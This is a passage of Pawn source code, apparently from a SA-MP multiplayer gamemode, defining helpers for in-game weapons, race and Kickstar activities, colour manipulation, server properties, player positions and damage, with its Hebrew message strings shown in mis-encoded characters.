	return costByLevel - (costByLevel * (VIP_WeaponDiscount[playerinfo[playerid][vip]] / 100));
}
//=[RemovePlayerWeapon]=========================================================
stock RemovePlayerWeapon(playerid,weaponid)
{
	SetPlayerAmmo(playerid,weaponid,0);
	playerinfo[playerid][acweapons][GetWeaponSlot(weaponid)] = false;
	playerinfo[playerid][acammon][GetWeaponSlot(weaponid)] = 0;
	return 1;
}
stock RemoveWeaponFromSlot(playerid, iWeaponSlot)
{
    new weaponsaviv[13][2];
    for(new i = 0; i < 13; i++) GetPlayerWeaponData(playerid,i,weaponsaviv[i][0],weaponsaviv[i][1]);
	weaponsaviv[iWeaponSlot][0] = 0;
    ResetPlayerWeapons(playerid);
    for(new i = 0; i < 13; i++) GivePlayerWeapon(playerid, weaponsaviv[i][0], weaponsaviv[i][1]);
    return 1;
}
//=[CrazyRaceJoin]==============================================================
stock CrazyRaceJoin(playerid)
{
	new string[M_S], vmsg[M_S];
	switch(GetVehicleModel(GetPlayerVehicleID(playerid)))
	{
		case 406: vmsg = "!?°тЄ °тЄ, цр· ьр фю∙рщ· фЄЁўщ· фцр·";
		case 407: vmsg = "(: рЁчЁх сшхчщэ ∙сющ°хї ьр ·фщф ∙°щЇф";
		case 408: vmsg = "ю∙рщ· цсь..? Ёх шхс, тэ цсьЁщэ Ў°щыщэ ьф·Ї°ёэ";
		case 409: vmsg = "Єэ ьщюхцщЁф рухЁщ фЄ∙щ°, ьр ·Ўьщч ьЄсх° рЇщьх 2 Ў'ўЇхщЁшщэ";
		case 411: vmsg = "!рщЁЇ°Ёхё фр? счщ°ф юЎхщщЁ·";
		case 416: vmsg = "?шхс, фср· р· цф ыщ ч∙с· ∙щфщх ю·юхуущэ чхьщэ сющ°хї";
		case 420: vmsg = "ющ∙фх Ў°щъ юхЁщ·?! ьр ч∙хс, ·∙·ю∙х сюыхЁщх· ∙ьыэ";
		case 423: vmsg = "Ёх срю·, рхшх тьщуф? ьр ·тщЄ °чхў";
		case 425: vmsg = "?фрЁш°??? Ї°Ўф юьчюф";
		case 431, 437: vmsg = "!щрщ, схрх Ёўщэ ·чЁ· рхшхсхё срюЎЄ фющ°хї";
		case 434: vmsg = "!фюыхЁщ· фшхсф сщх·° сю∙чў. рщцх счщ°ф";
		case 444: vmsg = "юхЁёш°... шхс, ·ю∙щъ ьЁёх· ьфЇчщу р· фю·юхуущэ";
		case 447: vmsg = "?фщщ чс°'ф! фср·щ юёхў щх°ф ьющ°хї, трхЁщ ьр";
		case 448: vmsg = "!фьх? ющ∙фх Їф фцющя ЇщЎф? рЁщ ьр юхЎр р· фы·хс· фтЄ·щ ьрщцф ющ°хї";
		case 451: vmsg = "?шх°щёюх? цф ыь юф ∙щыхь· ьюЎхр с°щщё";
		case 460: vmsg = "юшхё щющ, ьюў°ф ∙ЁЎш°ъ тэ ьЄхє хтэ ь∙чх·";
		case 463: vmsg = "рщцф рхЇЁхЄ, рщцф Є°ё";
		case 486: vmsg = "!ш°ўшх°? рщцф чхЇ°";
		case 493: vmsg = "!схрх ыхьЁх Ё∙хш Єь фысщ∙ Єэ фёщ°ф ∙ьщ";
		case 509: vmsg = "?рхЇЁщщэ сющ°хї? ьря фтЄЁх";
		case 513: vmsg = "Ёфу°, юшхё ЇЄьхьщэ! ∙Є∙Є р· фю·юхуущэ";
		case 520: vmsg = "!?фщу°ф?! ф∙·тЄ·";
		case 522: vmsg = "рхЇЁхЄ фр? щЇф";
		case 577, 592: vmsg = "!!!юшхё ЄЎхэ стхуьх су°ъ";
		case 596, 597, 598, 599: vmsg = "!·ЄЎ°х, ю∙ш°ф! фющ°хї фцф ьр чхўщ";
		case 601: vmsg = "?ющ сщў∙ ∙шщЇф ь°ыс";
		default: vmsg = "ьюЄ°ы· рщя юф ьы·хс, щщ·ыя ыщ ф°ыс ∙сч°· ьр ∙ххф ы·щсф";
	}
	format(string,sizeof(string)," (%s) !Crazy Race фЎш°є ь %s",vmsg,GetName(playerid));
	return string;
}
//=[News]=======================================================================
stock News(string[],id=-1,bool:wanted=false)
{
	new string2[256];
	format(string2,sizeof(string2)," ╗ News: %s",string);
	if(id == -1)
	{
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i) && ((wanted && playerinfo[i][setting][setting_showwanted]) || !wanted)) SendClientMessage(i,purple,string2);
	}
	else if(!playerinfo[id][setting][setting_showwanted] && wanted) SendClientMessage(id,purple,string2);
}
//=[stradd]=====================================================================
stock stradd(string[],addstr[],pos)
{
	new firststr[128], endstr[128], retstr[128];
	strmid(firststr,string,0,pos-1);
	strmid(endstr,string,pos+1,strlen(string));
	format(retstr,sizeof(retstr),"%s%s%s",firststr,addstr,endstr);
	return retstr;
}
//=[CreateFirework]=============================================================
stock CreateFirework(model,Float:x,Float:y,Float:z,Float:height,Float:mspeed)
{
	new o = CreateSObject(model,x,y,z,0.0,0.0,0.0);
	MoveSObject(o,x,y,z + height,mspeed);
	objectinfo[o][odam] = 1;
	objectinfo[o][oeam] = 6;
	firework[fireworks++] = o;
	return 0;
}
//=[HideMap]====================================================================
stock HideMap(playerid,show)
{
	playerinfo[playerid][hidem] = show;
	if(show) TextDrawShowForPlayer(playerid,hidemap);
	else TextDrawHideForPlayer(playerid,hidemap);
}
//=[EndKickstar]================================================================
stock EndKickstar(reason[],adminid)
{
	new string[M_S];
	assert kickstarinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф Kickstar ·ч°х· ф");
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя Kickstar ·ч°х· ф",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inkickstar] || playerinfo[i][waitkickstar]))
		{
			if(playerinfo[i][inkickstar])
			{
				SetVehicleToRespawn(GetPlayerVehicleID(i));
				SpawnPlayer(i);
				LinkVehicleToInterior(GetPlayerVehicleID(i),0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
				SetPlayerVirtualWorld(i,world_normal);
				if(playerinfo[i][kickstarprize]) playerinfo[i][speedup][0] = 0.0, playerinfo[i][speedup][1] = 0.0, playerinfo[i][speedup][2] = 0.0, playerinfo[i][abf][0] = 0, playerinfo[i][abf][1] = INVALID_VEHICLE_ID;
				SendClientMessage(i,orange," .схшьф Kickstar ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙·ч°х· ф");
				GiveMoney(i,join_act);
				DisablePlayerCheckpoint(i);
			}
			playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1, playerinfo[i][kickstarscore] = 0, playerinfo[i][kickstarprize] = 0, playerinfo[i][kickstarbonus] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
	KillTimer(kickstarinfo[3]);
	TextDrawHideForAll(activityHighScores);
	TextDrawDestroy(activityHighScores);
	activityHighScores = INVALID_TEXT_DRAW;
	thereIsAct = false;
	return 1;
}
//=[IsSomeoneNearKSPos]=========================================================
stock IsSomeoneNearKSPos(pos)
{
	new Float:p[3];
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
	{
		GetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]);
		if(DistanceToPoint(p[0],p[1],p[2],Kickstar[pos][0],Kickstar[pos][1],Kickstar[pos][2]) <= 1.5) return 1;
	}
	return 0;
}
//=[GetWeaponSlot]==============================================================
stock GetWeaponSlot(wid)
{
	switch(wid)
	{
		case 0, 1: return 0;
		case 2..9: return 1;
		case 22..24: return 2;
		case 25..27: return 3;
		case 28, 29, 32: return 4;
		case 30, 31: return 5;
		case 33, 34: return 6;
		case 35..38: return 7;
		case 16..19, 39: return 8;
		case 41..43: return 9;
		case 10..15: return 10;
		case 44..46: return 11;
		case 40: return 12;
		default: return -1;
	}
	return -1;
}
//=[GetWeaponAmmunationColor]===================================================
stock GetWeaponAmmunationColor(wslot,ammu=1)
{
	new ret[16];
	if(ammu) switch(wslot)
	{
		case 0: ret = @c(red); // Pistols
		case 1: ret = @c(orange); // Shotguns
		case 2: ret = @c(yellow); // SMGs
		case 3: ret = @c(lightblue); // Assault
		case 4: ret = @c(purple); // Rifles
		case 5: ret = @c(green); // Throw
		case 6: ret = @c(blue); // Heavy
		case 7: ret = @c(pink); // Spray + FE
		case 8: ret = @c(white); // BK
		case 9: ret = @c(grey); // Melee
	}
	else switch(wslot)
	{
		case 2: ret = @c(red); // Pistols
		case 3: ret = @c(orange); // Shotguns
		case 4: ret = @c(yellow); // SMGs
		case 5: ret = @c(lightblue); // Assault
		case 6: ret = @c(purple); // Rifles
		case 8: ret = @c(green); // Throw
		case 7: ret = @c(blue); // Heavy
		case 9: ret = @c(pink); // Spray + FE
		case 0: ret = @c(white); // BK
		case 1: ret = @c(grey); // Melee
	}
	return ret;
}
//=[Colors]=====================================================================
/*
	Functions from "color.inc"
	by Simon
	Improved by me
*/
stock setRed(hexColor,red2)
{
	if(red2 > 0xFF) red2 = 0xFF;
	else if(red2 < 0x00) red2 = 0x00;
	return (hexColor & 0x00FFFFFF) | (red2 << 24);
}
stock setGreen(hexColor,green2)
{
	if(green2 > 0xFF) green2 = 0xFF;
	else if(green2 < 0x00) green2	= 0x00;
	return (hexColor & 0xFF00FFFF) | (green2 << 16);
}
stock setBlue(hexColor,blue2)
{
	if(blue2 > 0xFF) blue2 = 0xFF;
	else if(blue2 < 0x00) blue2 = 0x00;
	return (hexColor & 0xFFFF00FF) | (blue2 << 8);
}
stock setAlpha(hexColor,alpha)
{
	if(alpha > 0xFF) alpha = 0xFF;
	else if(alpha < 0x00) alpha = 0x00;
	return (hexColor & 0xFFFFFF00) | alpha;
}
stock stripRed(hexColor) return (hexColor) & 0x00FFFFFF;
stock stripGreen(hexColor) return (hexColor) & 0xFF00FFFF;
stock stripBlue(hexColor) return (hexColor) & 0xFFFF00FF;
stock stripAlpha(hexColor) return (hexColor) & 0xFFFFFF00;
stock fillRed(hexColor) return (hexColor) | 0xFF000000;
stock fillGreen(hexColor) return (hexColor) | 0x00FF0000;
stock fillBlue(hexColor) return (hexColor) | 0x0000FF00;
stock fillAlpha(hexColor) return (hexColor) | 0x000000FF;
stock getRed(hexColor) return (hexColor >> 24) & 0x000000FF;
stock getGreen(hexColor) return (hexColor >> 16) & 0x000000FF;
stock getBlue(hexColor) return (hexColor >> 8) & 0x000000FF;
stock getAlpha(hexColor) return (hexColor) & 0x000000FF;
//=[timerprop]==================================================================
stock timerprop(t)
{
	new string[32];
	format(string,sizeof(string),"timer_%d",t);
	return string;
}
//=[GPropertyExists_INT]========================================================
stock GPropertyExists_INT(name[]) return existproperty(.name=name);
//=[GetGProperty_INT]===========================================================
stock GetGProperty_INT(name[]) return getproperty(.name=name);
//=[SetGProperty_INT]===========================================================
stock SetGProperty_INT(name[],value,duration=0)
{
	new flag = -1, bool:ex = bool:PropertyExists_INT(name);
	for(new i = 0; i < MAX_GPROPERTIES && flag == -1; i++) if((ex && equal(gproperties[i][gpName],name)) || (!ex && !gproperties[i][gpValid])) flag = i;
	gproperties[flag][gpValid] = 1;
	gproperties[flag][gpType] = gptype_int;
	gproperties[flag][gpDuration] = duration;
	format(gproperties[flag][gpName],64,name);
	valstr(gproperties[flag][gpValue],value);
	return setproperty(.name=name,.value=value);
}
//=[RemoveGProperty_INT]========================================================
stock RemoveGProperty_INT(name[])
{
	if(!GPropertyExists_INT(name)) return 1;
	new flag = -1;
	for(new i = 0; i < MAX_GPROPERTIES && flag == -1; i++) if(equal(gproperties[i][gpName],name)) flag = i;
	gproperties[flag][gpValid] = 0;
	gproperties[flag][gpDuration] = 0;
	format(gproperties[flag][gpName],64,"");
	format(gproperties[flag][gpValue],64,"");
	gproperties[flag][gpType] = gptype_null;
	return deleteproperty(.name=name);
}
//=[GPropertyExists_STR]========================================================
stock GPropertyExists_STR(name[]) return existproperty(.value=hash(name));
//=[GetGProperty_STR]===========================================================
stock GetGProperty_STR(name[])
{
	new getAs[M_S];
	getproperty(.value=hash(name),.string=getAs);
	strunpack(getAs,getAs,sizeof(getAs));
	return getAs;
}
//=[SetGProperty_STR]===========================================================
stock SetGProperty_STR(name[],value[],duration=0)
{
	new flag = -1, bool:ex = bool:PropertyExists_STR(name);
	for(new i = 0; i < MAX_GPROPERTIES && flag == -1; i++) if((ex && equal(gproperties[i][gpName],name)) || (!ex && !gproperties[i][gpValid])) flag = i;
	gproperties[flag][gpValid] = 1;
	gproperties[flag][gpType] = gptype_str;
	gproperties[flag][gpDuration] = duration;
	format(gproperties[flag][gpName],64,name);
	format(gproperties[flag][gpValue],64,value);
	return setproperty(.value=hash(name),.string=value);
}
//=[RemoveGProperty_STR]========================================================
stock RemoveGProperty_STR(name[])
{
	if(!GPropertyExists_STR(name)) return 1;
	new flag = -1;
	for(new i = 0; i < MAX_GPROPERTIES && flag == -1; i++) if(equal(gproperties[i][gpName],name)) flag = i;
	gproperties[flag][gpValid] = 0;
	format(gproperties[flag][gpName],64,"");
	format(gproperties[flag][gpValue],64,"");
	gproperties[flag][gpType] = gptype_null;
	return deleteproperty(.value=hash(name));
}
//=[PropertyExists_INT]=========================================================
stock PropertyExists_INT(name[]) return GetSVarType(name) != SERVER_VARTYPE_NONE;
//=[GetProperty_INT]============================================================
stock GetProperty_INT(name[]) return GetSVarInt(name);
//=[SetProperty_INT]============================================================
stock SetProperty_INT(name[],value,duration=0)
{
	if(duration > 0)
	{
		new s[64];
		format(s,sizeof(s),"%s_duration",name);
		SetSVarInt(name,duration);
	}
	return SetSVarInt(name,value);
}
//=[RemoveProperty_INT]=========================================================
stock RemoveProperty_INT(name[])
{
	if(!PropertyExists_INT(name)) return 1;
	new s[64];
	format(s,sizeof(s),"%s_duration",name);
	if(PropertyExists_INT(s)) DeleteSVar(s);
	return DeleteSVar(name);
}
//=[PropertyExists_STR]=========================================================
stock PropertyExists_STR(name[]) return GetSVarType(name) != SERVER_VARTYPE_NONE;
//=[GetProperty_STR]============================================================
stock GetProperty_STR(name[])
{
	new getAs[M_S];
	GetSVarString(name,getAs,sizeof(getAs));
	return getAs;
}
//=[SetProperty_STR]============================================================
stock SetProperty_STR(name[],value[],duration=0)
{
	if(duration > 0)
	{
		new s[64];
		format(s,sizeof(s),"%s_duration",name);
		SetSVarInt(name,duration);
	}
	return SetSVarString(name,value);
}
//=[RemoveProperty_STR]=========================================================
stock RemoveProperty_STR(name[])
{
	if(!PropertyExists_INT(name)) return 1;
	new s[64];
	format(s,sizeof(s),"%s_duration",name);
	if(PropertyExists_INT(s)) DeleteSVar(s);
	return DeleteSVar(name);
}
//=[hash]=======================================================================
stock hash(string[])
{   // by DracoBlue, improved by me
	new s[2] = {1,0};
	for(new i = 0, l = strlen(string); i < l; i++) s[0] = (s[0] + string[i]) % 65521, s[1] = (s[1] + s[0]) % 65521;
	return (s[1] << 16) + s[0];
}
//=[IsWBColor]==================================================================
stock IsWBColor(r,g,b) return (r+g+b) <= 30 || (r+g+b) >= 735;
//=[SavePlayerPos]==============================================================
stock SavePlayerPos(playerid)
{
	playerinfo[playerid][slastdata][0] = GetPlayerState(playerid);
	playerinfo[playerid][slastdata][1] = GetPlayerInterior(playerid);
	playerinfo[playerid][slastdata][2] = GetPlayerVirtualWorld(playerid);
	playerinfo[playerid][slastdata][3] = IsPlayerInAnyVehicle(playerid) ? GetPlayerVehicleID(playerid) : INVALID_VEHICLE_ID;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		GetPlayerPos(playerid,playerinfo[playerid][slastpos][0],playerinfo[playerid][slastpos][1],playerinfo[playerid][slastpos][2]);
		GetPlayerFacingAngle(playerid,playerinfo[playerid][slastpos][3]);
	}
}
//=[LoadPlayerPos]==============================================================
stock LoadPlayerPos(playerid,type = 0)
{
	if(type == 0) playerinfo[playerid][loadpos] = 1;
	else
	{
		SetPlayerInterior(playerid,playerinfo[playerid][slastdata][1]);
		SetPlayerVirtualWorld(playerid,playerinfo[playerid][slastdata][2]);
		switch(playerinfo[playerid][slastdata][0])
		{
			case PLAYER_STATE_ONFOOT:
			{
				SetPlayerPos(playerid,playerinfo[playerid][slastpos][0],playerinfo[playerid][slastpos][1],playerinfo[playerid][slastpos][2]);
				SetPlayerFacingAngle(playerid,playerinfo[playerid][slastpos][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				new Float:p[3];
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,playerinfo[playerid][slastdata][3]))
				{
					GetVehiclePos(GetPlayerVehicleID(i),p[0],p[1],p[2]);
					SetPlayerPos(i,p[0],p[1],p[2] + 3.0);
				}
				PutPlayerInVehicle(playerid,playerinfo[playerid][slastdata][3],0);
			}
			case PLAYER_STATE_PASSENGER: PutPlayerInNextSeatOfVehicle(playerid,playerinfo[playerid][slastdata][3],1);
		}
		SetCameraBehindPlayer(playerid);
		playerinfo[playerid][loadpos] = 0;
	}
}
//=[PutPlayerInNextSeatOfVehicle]===============================================
stock PutPlayerInNextSeatOfVehicle(playerid,vehicleid,ignoredriver)
{
	new nextSeat = ignoredriver;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,vehicleid) && GetPlayerVehicleSeat(i) != nextSeat && (nextSeat < 4 && GetVehicleModel(vehicleid) != 431 && GetVehicleModel(vehicleid) != 437)) return PutPlayerInVehicle(playerid,vehicleid,nextSeat); else nextSeat++;
	return nextSeat;
}
//=[GetAmmo]====================================================================
stock GetAmmo(playerid)
{
	new d[2];
	GetPlayerWeaponData(playerid,GetWeaponSlot(GetPlayerWeapon(playerid)),d[0],d[1]);
	return d[1];
}
//=[GetAmmoBySlot]==============================================================
stock GetAmmoBySlot(playerid,slot)
{
	new d[2];
	GetPlayerWeaponData(playerid,slot,d[0],d[1]);
	return d[1];
}
//=[command]====================================================================
stock command(playerid,cmd[])
{
	playerinfo[playerid][dscmd] = 1;
	OnPlayerCommandText(playerid,cmd);
	playerinfo[playerid][dscmd] = 0;
	return 1;
}
//=[strmul]=====================================================================
stock strmul(string[],times)
{
	new returned[M_S];
	for(new i = 0; i < times; i++) format(returned,sizeof(returned),"%s%s",returned,string);
	return returned;
}
//=[strcount]===================================================================
stock strcount(string[],find[])
{
	new p = strfind(string,find,true), count = 0;
	while(p != -1) count++, p = strfind(string,find,true,p + 1);
	return count;
}
//=[ShowPlayerDialog2]==========================================================
#undef ShowPlayerDialog
stock ShowPlayerDialog2(playerid,dialogid,dstyle,caption[],info[],button1[],button2[])
{
	playerinfo[playerid][indialog] = dialogid;
	SetPVarInt(playerid,"dialog_id",dialogid);
	SetPVarInt(playerid,"dialog_style",dstyle);
	SetPVarString(playerid,"dialog_caption",caption);
	SetPVarString(playerid,"dialog_info",info);
	SetPVarString(playerid,"dialog_b1",button1);
	SetPVarString(playerid,"dialog_b2",button2);
	return ShowPlayerDialog(playerid,dialogid,dstyle,caption,info,button1,button2);
}
#define ShowPlayerDialog ShowPlayerDialog2
//=[HidePlayerDialog]===========================================================
stock HidePlayerDialog(playerid) return ShowPlayerDialog(playerid,playerinfo[playerid][indialog] = -1,DIALOG_STYLE_MSGBOX,"","","","");
//=[IsPlayerConnected2]=========================================================
#undef IsPlayerConnected
stock IsPlayerConnected2(playerid) return playerid >= 0 && playerid < MAX_PLAYERS ? connected[playerid] : 0;
stock IsPlayerConnected_RealOne(playerid) return IsPlayerConnected(playerid);
#define IsPlayerConnected IsPlayerConnected2
//=[SavePlayerWeapons]==========================================================
stock SavePlayerWeapons(playerid)
{
	new c = 0;
	for(new i = 1; i < 13; i++)
	{
		GetPlayerWeaponData(playerid,i,playerinfo[playerid][savedweapons][i],playerinfo[playerid][savedammo][i]);
		c++;
	}
	return c;
}
//=[LoadPlayerWeapons]==========================================================
stock LoadPlayerWeapons(playerid)
{
	for(new i = 1; i < 13; i++)
	{
		GiveWeapon(playerid,playerinfo[playerid][savedweapons][i],playerinfo[playerid][savedammo][i]);
		playerinfo[playerid][savedweapons][i] = 0, playerinfo[playerid][savedammo][i] = 0;
	}
	return 1;
}
//=[CountSavedWeapons]==========================================================
stock CountSavedWeapons(playerid)
{
	new c = 0;
	for(new i = 1; i < 13; i++) if(playerinfo[playerid][savedweapons][i] > 0) c++;
	return c;
}
//=[IsPlayerNearAnyObject]======================================================
stock IsPlayerNearAnyObject(playerid)
{
	for(new i = 0; i < max_objects; i++) if(IsPlayerInRangeOfPoint(playerid,3.0,objectinfo[i][opos][0],objectinfo[i][opos][1],objectinfo[i][opos][2])) return 1;
	return 0;
}
//=[MovingText]=================================================================
stock MovingText(text[], textid, col=0xffffffff, Text:drw=Text:INVALID_TEXT_DRAW, Float:x=0.0, Float:y=0.0)
{
	if(!strlen(text)) movingtext[textid] = drw, movingtextinfo[textid][mtX] = x, movingtextinfo[textid][mtY] = y;
	else
	{
		movingtext[textid] = TextDrawCreate(650.000000,325.000000 - (textid * 20.000000),text);
		movingtextinfo[textid][mtX] = 650.000000, movingtextinfo[textid][mtY] = 325.000000 - (textid * 20.000000);
		format(movingtextinfo[textid][mtText],MAX_MOVINGTEXT_LENGTH,text);
		TextDrawAlignment(movingtext[textid],0);
		TextDrawBackgroundColor(movingtext[textid],0x000000ff);
		TextDrawFont(movingtext[textid],1);
		TextDrawLetterSize(movingtext[textid],0.399999,1.399999);
		TextDrawColor(movingtext[textid],col);
		TextDrawSetProportional(movingtext[textid],1);
		TextDrawSetShadow(movingtext[textid],1);
	}
	TextDrawShowForAll(movingtext[textid]);
	movingtextinfo[textid][mtUsing] = 1;
	return 1;
}
//=[UpdateBank]=================================================================
stock UpdateBank(name[],text[],sum)
{
	#pragma unused text
	new playerid = GetExactID(name), f[64], string[128];
	format(f,sizeof(f),"/DM/Users/%s.ini",name);
	if(!fexist(f)) return 1;
	if(IsPlayerConnected(playerid))
	{
		playerinfo[playerid][bank] += sum;
		Border(playerid,"update");
		fsetint(f,"Bank",playerinfo[playerid][bank]);
		format(string,sizeof(string),@c(yellow) "ёыхэ фыёє ссЁў ∙ьъ:\n" @c(green) "%d$",playerinfo[playerid][bank]);
		SetPerPlayer3DTextLabel(playerid,ppt_bank,string);
	}
	else fsetint(f,"Bank",fgetint(f,"Bank") + sum);
	return 1;
}
//=[SetWantedLevel==============================================================
stock SetWantedLevel(playerid,wlevel2,tl=1)
{
	SetPlayerWantedLevel(playerid,wlevel2);
	playerinfo[playerid][wantedlevel] = wlevel2;
	if(wlevel2 > 0 && tl)
	{
		new string[M_S], tele = GetPlayerTeleportArea(playerid);
		format(string,sizeof(string)," !хс°ю· фюсхў∙х· %d %s ЁюЎр юсхў∙ с∙э",wlevel2,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(playerinfo[i][work] == work_cop) SendClientMessage(i,blue,string);
		if(tele == -1) format(string,sizeof(string)," !фщр %d %s °ю· фюсхў∙х· ∙ь",wlevel2,GetName(playerid));
		else
		{
			switch(random(3))
			{
				case 0: format(string,sizeof(string)," %s ?фщр %d! чх∙сщэ ∙р·э юёхтьщэ ьф°хт рх·х %s °ю· фюсхў∙х· ∙ь",Teleports[tele][Tcmd],wlevel2,GetName(playerid));
				case 1: format(string,sizeof(string)," %s !?ўщсь °ю· юсхў∙х· %d ыщ ф°т ф°сф. щыхьщэ ьф°хт рх·х %s",Teleports[tele][Tcmd],wlevel2,GetName(playerid));
				case 2: format(string,sizeof(string)," %s !с°ю· юсхў∙х· %d, рЁчЁх Ў°щыщэ р· фЄц°ф ∙ьыэ сьф°хт рх·х %s",Teleports[tele][Tcmd],wlevel2,GetName(playerid));
			}
		}
		News(string);
	}
	return 1;
}
//=[PlayerHasWeapon]============================================================
stock PlayerHasWeapon(playerid,weaponid)
{
	new wd[2];
	GetPlayerWeaponData(playerid,GetWeaponSlot(weaponid),wd[0],wd[1]);
	return wd[0] == weaponid;
}
//=[IsPlayerNotAllowedToUseCommand]=============================================
stock IsPlayerNotAllowedToUseCommand(playerid,cmd[],cmdtext[])
{
	if(!playerinfo[playerid][logged]) return 0;
	new string[32], getting[32];
	for(new i = 1; i <= 10; i++)
	{
		format(string,sizeof(string),"NoCMD%d",i);
		GetPVarString(playerid,string,getting,sizeof(getting));
		if(equal(cmd,getting)) return 1;
	}
	for(new i = 1; i <= 10; i++)
	{
		format(string,sizeof(string),"NoCMDEx%d",i);
		GetPVarString(playerid,string,getting,sizeof(getting));
		if(equal(cmdtext,getting)) return 1;
	}
	return 0;
}
//=[strs]=======================================================================
stock strs(string[],times)
{
	new returned[M_S];
	for(new i = 0; i < times; i++) format(returned,sizeof(returned),"%s%s",returned,string);
	return returned;
}
//=[cmdprop]====================================================================
stock cmdprop(cmd[])
{
	new str[64];
	format(str,sizeof(str),cmd);
	for(new i = 0, j = strlen(str); i < j; i++) if(str[i] >= 'A' && str[i] <= 'Z') str[i] += 32;
	return str;
}
//=[lcmdid]=====================================================================
stock lcmdid(cmd[],s=0)
{
	new str[64], ret = -1;
	format(str,sizeof(str),"%s_%c",cmdprop(cmd),s ? 'a' : 'b');
	if(PropertyExists_INT(str)) ret = GetProperty_INT(str);
	else for(new i = 0; i < sizeof(lcmds) && ret == -1; i++) if(equal(lcmds[i][lcCommand],cmd) || equal(lcmds[i][lcShort],cmd) || equal(lcmds[i][lcShort2],cmd)) SetProperty_INT(str,ret = s ? lcmds[i][lcCMDID] : i);
	return ret;
}
//=[Damage]=====================================================================
stock Damage(playerid,Float:dmg,from=INVALID_PLAYER_ID,bool:text=true)
{
	if(playerinfo[playerid][gm]) return 1;
	new Float:h, Float:a;
	GetPlayerHealth(playerid,h);
	GetPlayerArmour(playerid,a);
	CalculateHealth(h,a,0-dmg);
	SetPlayerHealth(playerid,h);
	SetPlayerArmour(playerid,a);
	/*if(h > 0.0)
	{
		SetPlayerArmour(playerid,h - dmg <= 0.0 ? 0.0 : h - dmg);
		if(h - dmg <= 0.0) dmg -= h;
	}
	else
	{
		if(dmg != 0.0)
		{
			GetPlayerHealth(playerid,h);
			SetPlayerHealth(playerid,h - dmg <= 0.0 ? 0.0 : h - dmg);
		}
	}*/
	if(dmg > 0.0 && text)
	{
		HPText(playerid,0-dmg);
		if(from != INVALID_PLAYER_ID)
		{
			HPText(from,dmg);
			playerinfo[from][damageforid][playerid] = true;
			SetPVarInt(playerid,dmgformat(from),1);
		}
	}
	return 1;
}
//=[AddHP]======================================================================
stock AddHP(playerid,Float:hp_)
{
	new Float:h, Float:a;
	GetPlayerHealth(playerid,h);
	GetPlayerArmour(playerid,a);
	CalculateHealth(h,a,hp_);
	SetPlayerHealth(playerid,h);
	SetPlayerArmour(playerid,a);
	/*SetPlayerHealth(playerid,h + hp_ < 100.0 ? h + hp_ : 100.0);
	if(floatadd(h,hp_) > 100) hp_ -= (100.0 - h);
	if(h >= 100.0)
	{
		GetPlayerArmour(playerid,h);
		SetPlayerArmour(playerid,h + hp_ < 100.0 ? h + hp_ : 100.0);
	}*/
	return 1;
}
//=[FindPlayer]=================================================================
stock FindPlayer(playerid,distance,Float:radius)
{
	new id = -1, Float:p[3], Float:rad = radius;
	for(new i = 0; i < distance; i++)
	{
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],0.5 + rad);
		rad += radius;
		for(new a = 0; a < MAX_PLAYERS_; a++) if(IsPlayerConnected(a) && IsPlayerStreamedIn(a,playerid) && GetPlayerDistanceToPointEx(a,p[0],p[1],p[2]) <= 2.5 && a != playerid)
		{
			id = a;
			break;
		}
	}
	return id;
}
//=[GetNPCID]===================================================================
stock GetNPCID(name[])
{
	new n = -1;
	if(PropertyExists_INT(name)) n = GetProperty_INT(name);
	else
	{
		for(new i = 0; i < sizeof(NPCs) && n == -1; i++) if(equal(NPCs[i][npcName],name)) n = i;
		SetProperty_INT(NPCs[n][npcName],n);
	}
	return n;
}
//=[fwrite_utf8]================================================================
#undef fwrite
stock fwrite_utf8(File:handle, str[], bool:use_utf8 = false)
{
	if(!handle) return 0;
	new x;
	while(str[x] != EOS) fputchar(handle,str[x++],use_utf8);
	return 1;
}
#define fwrite fwrite_utf8
//=[GetWeaponDefaultAmmo]=======================================================
stock GetWeaponDefaultAmmo(weaponid, playerid = -1)
{
	switch(weaponid)
	{
		case 0..15, 40, 44..46: return 0;
		case 17..18, 25, 33..36, 39: return 1;
		case 38, 41..42: return 500;
		case 22: return playerid != -1 && GetPlayerSkillLevel(playerid,WEAPONSKILL_PISTOL) >= 999 ? 34 : 17;
		case 26: return playerid != -1 && GetPlayerSkillLevel(playerid,WEAPONSKILL_SAWNOFF_SHOTGUN) >= 999 ? 4 : 2;
		case 28, 32: return playerid != -1 && GetPlayerSkillLevel(playerid,WEAPONSKILL_MIRCOUZI) >= 999 ? 100 : 50;
		case 23: return 17;
		case 24, 27: return 7;
		case 29, 30: return 30;
		case 31, 37: return 50;
		case 43: return 36;
	}
	return -1;
}
//=[SetPlayerSkillLevel2]=======================================================
#undef SetPlayerSkillLevel
stock SetPlayerSkillLevel2(playerid,skill,lvl)
{
	SetPlayerSkillLevel(playerid,skill,lvl);
	playerinfo[playerid][wskill][skill] = lvl;
}
#define SetPlayerSkillLevel SetPlayerSkillLevel2
//=[LinkVehicleToInterior2]=====================================================
#undef LinkVehicleToInterior
stock LinkVehicleToInterior2(vehicleid,interiorid,playerid=INVALID_PLAYER_ID)
{
